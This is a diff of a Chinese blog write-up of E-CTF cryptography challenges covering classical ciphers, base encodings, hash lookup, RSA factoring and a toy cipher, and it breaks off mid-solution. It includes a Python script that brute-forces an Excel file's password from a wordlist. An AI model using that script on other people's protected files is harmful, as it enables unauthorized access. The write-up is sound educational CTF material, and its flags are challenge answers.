@@ -201,150 +201,292 @@
             <h1 id="E-CTF比赛-Write-Up"><a href="#E-CTF比赛-Write-Up" class="headerlink" title="E-CTF比赛 Write Up"></a>E-CTF比赛 Write Up</h1><p>[TOC]</p>
 <h2 id="1-Cryptography（密码学）"><a href="#1-Cryptography（密码学）" class="headerlink" title="1. Cryptography（密码学）"></a>1. Cryptography（密码学）</h2><h3 id="ASCII-me-anything-but-not-the-flag"><a href="#ASCII-me-anything-but-not-the-flag" class="headerlink" title="ASCII me anything but not the flag"></a>ASCII me anything but not the flag</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250202225828882.png" alt="image-20250202225828882"></p>
 <p>根据它的提示，我们先将这段内容用ASCII解码，得到：</p>
-<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tap">108<span class="hljs-number"> 100 </span>111<span class="hljs-number"> 109 </span>123<span class="hljs-number"> 85 </span>99<span class="hljs-number"> 49 </span>122<span class="hljs-number"> 95 </span>106<span class="hljs-number"> 53 </span>95<span class="hljs-number"> 79 </span>111<span class="hljs-number"> 51 </span>95<span class="hljs-number"> 88 </span>52<span class="hljs-number"> 116 </span>95<span class="hljs-number"> 48 </span>109<span class="hljs-number"> 95 </span>51<span class="hljs-number"> 111 </span>88<span class="hljs-number"> 121 </span>90<span class="hljs-number"> 107 </span>97<span class="hljs-number"> 106 </span>48<span class="hljs-number"> 105 </span>125<span class="hljs-number"> 10 </span>10<span class="hljs-number"> 69 </span>98<span class="hljs-number"> 111 </span>98<span class="hljs-number"> 32 </span>102<span class="hljs-number"> 112 </span>32<span class="hljs-number"> 118 </span>108<span class="hljs-number"> 114 </span>111<span class="hljs-number"> 32 </span>104<span class="hljs-number"> 98 </span>118<span class="hljs-number"> 44 </span>32<span class="hljs-number"> 100 </span>108<span class="hljs-number"> 108 </span>97<span class="hljs-number"> 32 </span>105<span class="hljs-number"> 114 </span>122<span class="hljs-number"> 104 </span>32<span class="hljs-number"> 58 </span>32<span class="hljs-number"> 72 </span>66<span class="hljs-number"> 86 </span>72<span class="hljs-number"> 66 </span>86<span class="hljs-number"> 10 </span>10<span class="hljs-number"> 87 </span>101<span class="hljs-number"> 108 </span>108<span class="hljs-number"> 32 </span>100<span class="hljs-number"> 111 </span>110<span class="hljs-number"> 101 </span>44<span class="hljs-number"> 32 </span>98<span class="hljs-number"> 117 </span>116<span class="hljs-number"> 32 </span>110<span class="hljs-number"> 111 </span>119<span class="hljs-number"> 32 </span>100<span class="hljs-number"> 111 </span>32<span class="hljs-number"> 121 </span>111<span class="hljs-number"> 117 </span>32<span class="hljs-number"> 107 </span>110<span class="hljs-number"> 111 </span>119<span class="hljs-number"> 32 </span>97<span class="hljs-number"> 98 </span>111<span class="hljs-number"> 117 </span>116<span class="hljs-number"> 32 </span>116<span class="hljs-number"> 104 </span>101<span class="hljs-number"> 32 </span>103<span class="hljs-number"> 117 </span>121<span class="hljs-number"> 32 </span>119<span class="hljs-number"> 104 </span>111<span class="hljs-number"> 32 </span>103<span class="hljs-number"> 111 </span>116<span class="hljs-number"> 32 </span>115<span class="hljs-number"> 116 </span>97<span class="hljs-number"> 98 </span>98<span class="hljs-number"> 101 </span>100<span class="hljs-number"> 32 </span>50<span class="hljs-number"> 51 </span>32<span class="hljs-number"> 116 </span>105<span class="hljs-number"> 109 </span>101<span class="hljs-number"> 115 </span>32 63<br><br>-&gt;<br><br>ldom&#123;Uc1z_j5_Oo3_X4t_0m_3oXyZkaj0i&#125;<br><br>Ebob fp vlro hbv, dlla irzh : HBVHBV<br><br>Well done, but now do you know about the guy who got stabbed<span class="hljs-number"> 23 </span>times ?<br></code></pre></td></tr></table></figure>
+<pre><code>108 100 111 109 123 85 99 49 122 95 106 53 95 79 111 51 95 88 52 116 95 48 109 95 51 111 88 121 90 107 97 106 48 105 125 10 10 69 98 111 98 32 102 112 32 118 108 114 111 32 104 98 118 44 32 100 108 108 97 32 105 114 122 104 32 58 32 72 66 86 72 66 86 10 10 87 101 108 108 32 100 111 110 101 44 32 98 117 116 32 110 111 119 32 100 111 32 121 111 117 32 107 110 111 119 32 97 98 111 117 116 32 116 104 101 32 103 117 121 32 119 104 111 32 103 111 116 32 115 116 97 98 98 101 100 32 50 51 32 116 105 109 101 115 32 63
 
+-&gt;
+
+ldom&#123;Uc1z_j5_Oo3_X4t_0m_3oXyZkaj0i&#125;
+
+Ebob fp vlro hbv, dlla irzh : HBVHBV
+
+Well done, but now do you know about the guy who got stabbed 23 times ?
+</code></pre>
 <p>第三段的指的是凯撒大帝被刺杀的事件：</p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203124929054.png" alt="image-20250203124929054"></p>
 <p>所以我们尝试遍历前两段的凯撒加密结果，但只有第二段可以得到有用信息：</p>
-<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">Here <span class="hljs-keyword">is</span> your key, good luck : <span class="hljs-type">KEYKEY</span><br></code></pre></td></tr></table></figure>
-
+<pre><code>Here is your key, good luck : KEYKEY
+</code></pre>
 <p>可以得知密钥为：”HBVHBV“（我一开始以为密码就是KEYKEY）。由于第一段括号前的内容为4个字母，刚好对的上”ectf“，所以应该是单表或者多表替换加密。再因为密钥为重复的内容，不难猜测这应该是“Vigenere 维吉尼亚密码”。于是找个在线的解密网页（<a target="_blank" rel="noopener" href="https://planetcalc.com/2468/#google_vignette%EF%BC%89%E4%BE%BF%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%88%B0flag%EF%BC%9A">https://planetcalc.com/2468/#google_vignette）便可以得到flag：</a><br><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203125756246.png" alt="image-20250203125756246"></p>
-<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">ectf</span><span class="hljs-template-variable">&#123;th1s_i5_th3_w4y_0f_3ncrypti0n&#125;</span><br></code></pre></td></tr></table></figure>
-
-
-
-
-
+<pre><code>ectf&#123;th1s_i5_th3_w4y_0f_3ncrypti0n&#125;
+</code></pre>
 <h3 id="OIIAIOIIIAI-😼"><a href="#OIIAIOIIIAI-😼" class="headerlink" title="OIIAIOIIIAI 😼"></a>OIIAIOIIIAI 😼</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250202225852177.png" alt="image-20250202225852177"></p>
 <p>由于知道这次比赛的flag格式为ectf{}，所以不难发现这串字符的偶数位应该是flag的开头，也就是：</p>
-<figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-keyword">ectf</span>&#123;y0U_5p1N_M3<br></code></pre></td></tr></table></figure>
-
+<pre><code>ectf&#123;y0U_5p1N_M3
+</code></pre>
 <p>而由于}在字符串开头，所以猜测基数位的倒序为flag的后半部分：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">R1GhT_R0unD_B4bY&#125;<br></code></pre></td></tr></table></figure>
-
+<pre><code>R1GhT_R0unD_B4bY&#125;
+</code></pre>
 <p>拼在一起得到flag：</p>
-<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">ectf</span><span class="hljs-template-variable">&#123;y0U_5p1N_M3_R1GhT_R0unD_B4bY&#125;</span><br></code></pre></td></tr></table></figure>
-
-
-
-
-
+<pre><code>ectf&#123;y0U_5p1N_M3_R1GhT_R0unD_B4bY&#125;
+</code></pre>
 <h3 id="Hashes-Binder"><a href="#Hashes-Binder" class="headerlink" title="Hashes Binder"></a>Hashes Binder</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250202225920609.png" alt="image-20250202225920609"></p>
 <p>首先会下载得到3个文件：</p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203194946028.png" alt="image-20250203194946028"></p>
 <p>由于这份Excel文件被设置了密码保护，所以我们尝试用这个wordlist里的内容来爆破它：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> msoffcrypto<br><span class="hljs-keyword">import</span> io<br><br>encrypted_file = <span class="hljs-string">&quot;parts.xlsx&quot;</span> <br>password_list = <span class="hljs-string">&quot;wordlist.txt&quot;</span>  <br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(password_list, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    passwords = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines()]<br><br><span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> passwords:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(encrypted_file, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> file:<br>            office_file = msoffcrypto.OfficeFile(file)<br>            office_file.load_key(password=password)<br>            <br>            decrypted_file = io.BytesIO()<br>            office_file.decrypt(decrypted_file)<br>            <br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;成功破解密码: <span class="hljs-subst">&#123;password&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">continue</span><br><span class="hljs-comment"># 成功破解密码: dolphin</span><br></code></pre></td></tr></table></figure>
+<pre><code class="language-python">import msoffcrypto
+import io
 
+encrypted_file = &quot;parts.xlsx&quot; 
+password_list = &quot;wordlist.txt&quot;  
+
+with open(password_list, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f:
+    passwords = [line.strip() for line in f.readlines()]
+
+for password in passwords:
+    try:
+        with open(encrypted_file, &quot;rb&quot;) as file:
+            office_file = msoffcrypto.OfficeFile(file)
+            office_file.load_key(password=password)
+            
+            decrypted_file = io.BytesIO()
+            office_file.decrypt(decrypted_file)
+            
+            print(f&quot;成功破解密码: &#123;password&#125;&quot;)
+            break
+    except Exception:
+        continue
+# 成功破解密码: dolphin
+</code></pre>
 <p>打开Excel文件后会看到3部分内容</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Part</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">036074c2585230c1ad9e6b654a1671ac13ee856eb505f44346593e1748a6a52a</span><br><br><span class="hljs-attribute">Part</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">2H8ZcpmQyRisn</span><br><br><span class="hljs-attribute">Part</span> <span class="hljs-number">3</span><br><span class="hljs-attribute">cHJlc2NyaXB0aW9u</span><br><br></code></pre></td></tr></table></figure>
+<pre><code>Part 1
+036074c2585230c1ad9e6b654a1671ac13ee856eb505f44346593e1748a6a52a
 
+Part 2
+2H8ZcpmQyRisn
+
+Part 3
+cHJlc2NyaXB0aW9u
+</code></pre>
 <p>首先注意到第2，3部分非常像base64编码内容，于是尝试解码，第三部分会成功解出来：</p>
-<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">prescription</span><br></code></pre></td></tr></table></figure>
-
+<pre><code>prescription
+</code></pre>
 <p>第二部分则提示解码失败，所以我们尝试其他base解码，最后用base58成功解码得到：</p>
-<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">digestive</span><br></code></pre></td></tr></table></figure>
-
+<pre><code>digestive
+</code></pre>
 <p>第一部分则非常像哈希加密的结果，所以我们用这个网站试一下能不能破解</p>
 <p><a target="_blank" rel="noopener" href="https://hashes.com/en/decrypt/hash">https://hashes.com/en/decrypt/hash</a></p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203152026422.png" alt="image-20250203152026422"></p>
 <p>提示破解成功，原文为spooky，并且使用的算法是Gost Hash。（spooky其实也在这个wordlist.txt里，所以理论上来说这一步也可以用爆破得到。）</p>
 <p>于是用</p>
-<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">dolphin_spooky_digestive_prescription</span><br></code></pre></td></tr></table></figure>
-
+<pre><code>dolphin_spooky_digestive_prescription
+</code></pre>
 <p>成功解压.zip压缩包得到flag：</p>
-<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">ECTF&#123;J0nH_tH3_Cr4ck3R_<span class="hljs-number">95234826</span>&#125;<br></code></pre></td></tr></table></figure>
-
-
-
-
-
+<pre><code>ECTF&#123;J0nH_tH3_Cr4ck3R_95234826&#125;
+</code></pre>
 <h3 id="RSA-intro"><a href="#RSA-intro" class="headerlink" title="RSA intro"></a>RSA intro</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250202230145188.png" alt="image-20250202230145188"></p>
 <p>这道题我们会得到以下内容：</p>
-<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">n</span> <span class="hljs-operator">=</span> <span class="hljs-number">1184757578872726401875541948122658312538049254193811194706693679652903378440466755792536161053191231432973156335040510349121778456628168943028766026325269453310699198719079556693102485413885649073042144349442001704335216057511775363148519784811675479570531670763418634378774880394019792620389776531074083392140830437849497447329664549296428813777546855940919082901504207170768426813757805483319503728328687467699567371168782338826298888423104758901089557046371665629255777197328691825066749074347103563098441361558833400318385188377678083115037778182654607468940072820501076215527837271902427707151244226579090790964814802124666768804586924537209470827885832840263287617652116022064863681106011820233657970964986092799261540575771674176693421056457946384672759579487892764356140012868139174882562700663398653410810939857286089056807943991134484292518274473171647231470366805379774254724269612848224383658855657086251162811678080812135302264683778545807214278668333366983221748107612374568726991332801566415332661851729896598399859186545014999769601615937310266497300349207439222706313193098254004197684614395013043216709335205659801602035088735521560206321305834999363607988482888525092210585343868702766655032190348593070756595867719633492847013620378010952424253098519859359544101947494405255181048550165119679168071637363387551385352023888031983210940358096667928019837327581681936262186049576626435407253113152851511562799379477905913074052917135254673527350886619693800827592241738185465519368503599267554966329609741719839452532720121891782656000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001</span><br><span class="hljs-attribute">e</span> <span class="hljs-operator">=</span> <span class="hljs-number">65537</span><br><span class="hljs-attribute">c</span> <span class="hljs-operator">=</span> <span class="hljs-number">393830705821083872264416484945379590743951209334251680140561629963083955435155434968501995173717065691853716117413549060471633713246813706134614822460487831949312719410922980049951577395596254279195364667821988767675462852220254638390252652391863031378262058213973374365653466528787640726441241664538814924465041415751207617994829099967542528845558372954608772395722055861369383117996161988362298650918468621344968162697585757444815069821774651095279049590140325395770490299618719676066106689396243767847620065054763147901166291755102218540290732819710294120101688593205036339603152228827861450774360237006971191234350634731104643779249017990427055169232234892324512234471025984131134122883594190002695857381320761826426970820621555957081409595866374650139218172798735536295519361258955868218458841069870611367807353745731928726480481254620623949030522228724677423429285228917983167742866068764059333196595815029550909470984427785123479796787934189869159245455191142352654087327876642690754428041545205764160668875253155015956045237338532248073834631989395905208181116526111301051883717335829373670674970007067708289628731972707477338551521585672558157829354894929466723788269911067380887281008564055766243843557738727000164255990684153972958815292767702154995098383096546576559199090417518282978657504210433584144451378874050676287588884988934683793378300065910040270282398699691108573435112129408980056605713259535036581461672565785674329469547540861581715756111296028940885214170609934085009608200810707122173370006290459841638659407675519141544675968270051746963709729460531469035621873301953785282870733516854080405064440750450304537433849449545664331761838457477121677018421695909336075840076436991397964264703526101810961378256559625011198775706699</span><br><br></code></pre></td></tr></table></figure>
-
+<pre><code>n = 1184757578872726401875541948122658312538049254193811194706693679652903378440466755792536161053191231432973156335040510349121778456628168943028766026325269453310699198719079556693102485413885649073042144349442001704335216057511775363148519784811675479570531670763418634378774880394019792620389776531074083392140830437849497447329664549296428813777546855940919082901504207170768426813757805483319503728328687467699567371168782338826298888423104758901089557046371665629255777197328691825066749074347103563098441361558833400318385188377678083115037778182654607468940072820501076215527837271902427707151244226579090790964814802124666768804586924537209470827885832840263287617652116022064863681106011820233657970964986092799261540575771674176693421056457946384672759579487892764356140012868139174882562700663398653410810939857286089056807943991134484292518274473171647231470366805379774254724269612848224383658855657086251162811678080812135302264683778545807214278668333366983221748107612374568726991332801566415332661851729896598399859186545014999769601615937310266497300349207439222706313193098254004197684614395013043216709335205659801602035088735521560206321305834999363607988482888525092210585343868702766655032190348593070756595867719633492847013620378010952424253098519859359544101947494405255181048550165119679168071637363387551385352023888031983210940358096667928019837327581681936262186049576626435407253113152851511562799379477905913074052917135254673527350886619693800827592241738185465519368503599267554966329609741719839452532720121891782656000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001
+e = 65537
+c = 393830705821083872264416484945379590743951209334251680140561629963083955435155434968501995173717065691853716117413549060471633713246813706134614822460487831949312719410922980049951577395596254279195364667821988767675462852220254638390252652391863031378262058213973374365653466528787640726441241664538814924465041415751207617994829099967542528845558372954608772395722055861369383117996161988362298650918468621344968162697585757444815069821774651095279049590140325395770490299618719676066106689396243767847620065054763147901166291755102218540290732819710294120101688593205036339603152228827861450774360237006971191234350634731104643779249017990427055169232234892324512234471025984131134122883594190002695857381320761826426970820621555957081409595866374650139218172798735536295519361258955868218458841069870611367807353745731928726480481254620623949030522228724677423429285228917983167742866068764059333196595815029550909470984427785123479796787934189869159245455191142352654087327876642690754428041545205764160668875253155015956045237338532248073834631989395905208181116526111301051883717335829373670674970007067708289628731972707477338551521585672558157829354894929466723788269911067380887281008564055766243843557738727000164255990684153972958815292767702154995098383096546576559199090417518282978657504210433584144451378874050676287588884988934683793378300065910040270282398699691108573435112129408980056605713259535036581461672565785674329469547540861581715756111296028940885214170609934085009608200810707122173370006290459841638659407675519141544675968270051746963709729460531469035621873301953785282870733516854080405064440750450304537433849449545664331761838457477121677018421695909336075840076436991397964264703526101810961378256559625011198775706699
+</code></pre>
 <p>因为没有其他信息了，所以我们先用 <a target="_blank" rel="noopener" href="http://www.factordb.com/index.php">http://www.factordb.com/index.php</a> 试一下暴力分解n：<br><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203131647064.png" alt="image-20250203131647064"></p>
 <p>成功得到n的其中一个因数为5054843。之后就只需要写一段代码解密就可以得到flag：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse, long_to_bytes<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rsa_decrypt</span>(<span class="hljs-params">n, e, c, p</span>):<br>    q = n // p<br>    phi_n = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>    d = inverse(e, phi_n)<br>    m = <span class="hljs-built_in">pow</span>(c, d, n)<br>    <span class="hljs-keyword">return</span> long_to_bytes(m).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>n = <br>e = <span class="hljs-number">65537</span><br>c = <br>p = <span class="hljs-number">5054843</span>  <br>plaintext = rsa_decrypt(n, e, c, p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密结果:&quot;</span>, plaintext)<br><span class="hljs-comment"># 解密结果: ectf&#123;b4sic_F4cT0rDb_rS4&#125;</span><br></code></pre></td></tr></table></figure>
+<pre><code class="language-python">from Crypto.Util.number import inverse, long_to_bytes
 
-
-
-
-
+def rsa_decrypt(n, e, c, p):
+    q = n // p
+    phi_n = (p - 1) * (q - 1)
+    d = inverse(e, phi_n)
+    m = pow(c, d, n)
+    return long_to_bytes(m).decode(&#39;utf-8&#39;)
+n = 
+e = 65537
+c = 
+p = 5054843  
+plaintext = rsa_decrypt(n, e, c, p)
+print(&quot;解密结果:&quot;, plaintext)
+# 解密结果: ectf&#123;b4sic_F4cT0rDb_rS4&#125;
+</code></pre>
 <h3 id="Cracking-the-Vault"><a href="#Cracking-the-Vault" class="headerlink" title="Cracking the Vault"></a>Cracking the Vault</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250202230203405.png" alt="image-20250202230203405"></p>
 <p>这道题我们会得到2份文件，一份是python的代码，关于加密算法的，另一份文件则是加密后的结果。</p>
 <p>我们首先来看一下加密的具体过程：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> secrets<br><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encryption</span>(<span class="hljs-params">text</span>):<br>    encrypted = []<br>    random = secrets.SystemRandom()<br><br>    padding_length = <span class="hljs-number">256</span> - <span class="hljs-built_in">len</span>(text) % <span class="hljs-number">256</span><br>    raw_padding = [<span class="hljs-built_in">chr</span>(random.randint(<span class="hljs-number">32</span>, <span class="hljs-number">126</span>)) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(padding_length)]<br><br>    scrambled_padding = [<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(c) * <span class="hljs-number">3</span> + <span class="hljs-number">7</span>) % <span class="hljs-number">94</span> + <span class="hljs-number">32</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> raw_padding]<br>    shifted_padding = scrambled_padding[::-<span class="hljs-number">1</span>]<br><br>    padded_text = <span class="hljs-string">&#x27;&#x27;</span>.join(shifted_padding) + text<br><br>    final_padded_text = <span class="hljs-string">&#x27;&#x27;</span>.join(<br>        <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(c) ^ <span class="hljs-number">42</span>) % <span class="hljs-number">94</span> + <span class="hljs-number">32</span>) <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> c<br>        <span class="hljs-keyword">for</span> i, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(padded_text)<br>    )<br><br>    secret_key = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">sum</span>(<span class="hljs-built_in">ord</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> text))<br>    secret_key = secret_key[::-<span class="hljs-number">1</span>]<br><br>    hashed_key = hashlib.sha256(secret_key.encode()).hexdigest()<br><br>    seed = <span class="hljs-built_in">int</span>(hashed_key[:<span class="hljs-number">16</span>], <span class="hljs-number">16</span>)<br><br>    random = secrets.SystemRandom(seed)<br><br>    <span class="hljs-keyword">for</span> i, char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(text):<br>        char_code = <span class="hljs-built_in">ord</span>(char)<br>        shift = (i + <span class="hljs-number">1</span>) * <span class="hljs-number">3</span><br>        transformed = (char_code + shift + <span class="hljs-number">67</span>) % <span class="hljs-number">256</span><br>        encrypted.append(<span class="hljs-built_in">chr</span>(transformed))<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(encrypted), seed<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;VaultKey.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    text = f.read()<br><br>encrypted_text, seed = encryption(text)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;VaultKey_encrypted.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(encrypted_text)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;The file has been successfully encrypted!&quot;</span>)<br><br></code></pre></td></tr></table></figure>
+<pre><code class="language-python">import secrets
+import hashlib
 
+def encryption(text):
+    encrypted = []
+    random = secrets.SystemRandom()
+
+    padding_length = 256 - len(text) % 256
+    raw_padding = [chr(random.randint(32, 126)) for _ in range(padding_length)]
+
+    scrambled_padding = [chr((ord(c) * 3 + 7) % 94 + 32) for c in raw_padding]
+    shifted_padding = scrambled_padding[::-1]
+
+    padded_text = &#39;&#39;.join(shifted_padding) + text
+
+    final_padded_text = &#39;&#39;.join(
+        chr((ord(c) ^ 42) % 94 + 32) if i % 2 == 0 else c
+        for i, c in enumerate(padded_text)
+    )
+
+    secret_key = str(sum(ord(c) for c in text))
+    secret_key = secret_key[::-1]
+
+    hashed_key = hashlib.sha256(secret_key.encode()).hexdigest()
+
+    seed = int(hashed_key[:16], 16)
+
+    random = secrets.SystemRandom(seed)
+
+    for i, char in enumerate(text):
+        char_code = ord(char)
+        shift = (i + 1) * 3
+        transformed = (char_code + shift + 67) % 256
+        encrypted.append(chr(transformed))
+
+    return &#39;&#39;.join(encrypted), seed
+
+with open(&#39;VaultKey.txt&#39;, &#39;r&#39;) as f:
+    text = f.read()
+
+encrypted_text, seed = encryption(text)
+
+with open(&#39;VaultKey_encrypted.txt&#39;, &#39;w&#39;) as f:
+    f.write(encrypted_text)
+
+print(&quot;The file has been successfully encrypted!&quot;)
+</code></pre>
 <p>我们可以注意到这段代码里有很多多余的内容（指没有真正出现在加密过程中），真正跟加密算法相关的其实只有这一段</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i, char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(text):<br>        char_code = <span class="hljs-built_in">ord</span>(char)<br>        shift = (i + <span class="hljs-number">1</span>) * <span class="hljs-number">3</span><br>        transformed = (char_code + shift + <span class="hljs-number">67</span>) % <span class="hljs-number">256</span><br>        encrypted.append(<span class="hljs-built_in">chr</span>(transformed))<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(encrypted), seed<br></code></pre></td></tr></table></figure>
+<pre><code class="language-python">for i, char in enumerate(text):
+        char_code = ord(char)
+        shift = (i + 1) * 3
+        transformed = (char_code + shift + 67) % 256
+        encrypted.append(chr(transformed))
 
+    return &#39;&#39;.join(encrypted), seed
+</code></pre>
 <p>所以我们只需要逆向一下这个加密逻辑便可以得到flag：</p>
